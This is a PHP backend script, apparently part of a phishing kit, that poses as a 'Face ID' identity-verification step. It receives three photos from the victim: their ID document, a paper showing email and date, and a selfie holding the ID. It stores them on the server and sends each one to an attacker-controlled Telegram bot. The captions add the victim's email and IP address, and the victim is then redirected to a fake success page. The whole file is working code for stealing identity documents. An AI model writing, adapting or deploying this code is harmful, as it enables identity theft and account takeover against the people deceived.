<?php
// process_faceid.php
// Script para recibir, guardar y enviar las TRES imágenes de Face ID a Telegram.

session_start();

// 1. Cargar la configuración de Telegram
$config = require 'conexion.php'; 

if (!isset($config['telegram']['bot_token']) || !isset($config['telegram']['chat_id'])) {
    error_log("Error: Credenciales de Telegram no configuradas.");
    header('Location: error_page.php?title=' . urlencode('System Configuration Error') . '&message=' . urlencode('Telegram credentials are not set up. Please try again later.'));
    exit;
}

$botToken = $config['telegram']['bot_token'];
$chatId = $config['telegram']['chat_id'];

// *** CLAVE: RECIBIR LOS TRES TIPOS DE DATA ***
$id_data = $_POST['id_data'] ?? null;
$paper_data = $_POST['paper_data'] ?? null; // NUEVO CAMPO: Foto del papel
$selfie_data = $_POST['selfie_data'] ?? null;
$user_email = $_SESSION['logged_in_email'] ?? 'desconocido_'.time(); 

// --- FUNCIÓN PARA PROCESAR Y GUARDAR IMAGEN BASE64 ---
function saveBase64Image($base64_string, $output_file) {
    // La data Base64 viene con el prefijo "data:image/jpeg;base64,"
    $data = explode(',', $base64_string);
    if (count($data) < 2) return false;
    
    $image_binary = base64_decode($data[1]);
    if ($image_binary === false) return false;

    return file_put_contents($output_file, $image_binary);
}
// --------------------------------------------------------

// --- FUNCIÓN PARA ENVIAR IMAGEN A TELEGRAM ---
function sendPhotoToTelegram($botToken, $chatId, $photoPath, $caption) {
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    
    $post_fields = array(
        'chat_id' => $chatId,
        'caption' => $caption,
        'photo'   => new CURLFile($photoPath) // Usar CURLFile para subir archivos
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}
// --------------------------------------------------------

// *** CLAVE: VERIFICAR QUE LAS TRES FOTOS SE RECIBIERON ***
if ($id_data && $paper_data && $selfie_data) {
    
    // Definir la carpeta de subida y nombre de archivos
    $safe_email = preg_replace('/[^a-zA-Z0-9_\-.]/', '', $user_email);
    $dir = 'uploads/faceid/' . $safe_email . '/';
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    
    $timestamp = time();
    $id_filename = $dir . 'id_' . $timestamp . '.jpg';
    $paper_filename = $dir . 'paper_' . $timestamp . '.jpg'; // NUEVO NOMBRE DE ARCHIVO
    $selfie_filename = $dir . 'selfie_' . $timestamp . '.jpg';

    // 2. Guardar los TRES archivos en el servidor
    $id_saved = saveBase64Image($id_data, $id_filename);
    $paper_saved = saveBase64Image($paper_data, $paper_filename); // GUARDAR PAPEL
    $selfie_saved = saveBase64Image($selfie_data, $selfie_filename);

    if ($id_saved && $paper_saved && $selfie_saved) {
        
        $caption_base = "👤 *User:* " . htmlspecialchars($user_email) . "\n🌐 *IP:* " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n⏰ *Time:* " . date('Y-m-d H:i:s');
        
        // 3. Enviar la foto del ID a Telegram
        $caption_id = "🚨 *ID CAPTURE (DOCUMENT)* 🚨\n" . $caption_base;
        sendPhotoToTelegram($botToken, $chatId, $id_filename, $caption_id);
        
        // 4. Enviar la foto del Papel a Telegram
        $caption_paper = "📄 *PAPER CAPTURE (EMAIL/DATE)* 📄\n" . $caption_base;
        sendPhotoToTelegram($botToken, $chatId, $paper_filename, $caption_paper);
        
        // 5. Enviar la foto Selfie a Telegram
        $caption_selfie = "🤳 *SELFIE WITH ID CAPTURE* 🤳\n" . $caption_base;
        sendPhotoToTelegram($botToken, $chatId, $selfie_filename, $caption_selfie);
        
        // 6. Redirigir al siguiente paso
        header('Location: verification_success.php');
        exit;
    } else {
        // ERROR: Falló al guardar en el disco (problema de permisos)
        $title = "Failed to Save Your Images";
        $message = "We could not save the images to the server. Please check 'uploads/faceid/' folder permissions.";
        error_log("FaceID Error: Failed to save images for: " . $user_email);
        header('Location: error_page.php?title=' . urlencode($title) . '&message=' . urlencode($message));
        exit;
    }

} else {
    // ERROR: Datos faltantes
    $title = "Missing Images";
    $message = "You must complete the capture of all three photos (ID, Paper, and Selfie) before clicking Submit.";
    header('Location: error_page.php?title=' . urlencode($title) . '&message=' . urlencode($message));
    exit;
}